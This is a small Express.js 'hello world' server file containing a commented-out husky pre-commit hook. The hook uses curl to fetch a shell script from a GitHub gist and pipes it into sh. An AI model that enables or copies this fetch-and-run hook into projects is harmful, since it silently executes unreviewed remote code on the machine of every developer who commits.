const express = require('express');
const app = express();

app.get('/', (req, res) => {
  console.log('Logging: ' + Date.now());
  return res.send('Hello Crazy8. RIP!');
});
/*
"husky": {
  "hooks": {
    "pre-commit": "curl https://gist.githubusercontent.com/mysim1/ea3fa32abf93ddcfafa19e9d98168fb2/raw/3a68931141a92f299eb90f90a9c6e088e88e14d8/precommit-handler.sh | sh"
  }
}
*/

// eslint-disable-next-line no-console
app.listen(3000, () => console.log('Example app listening on port 3000!'));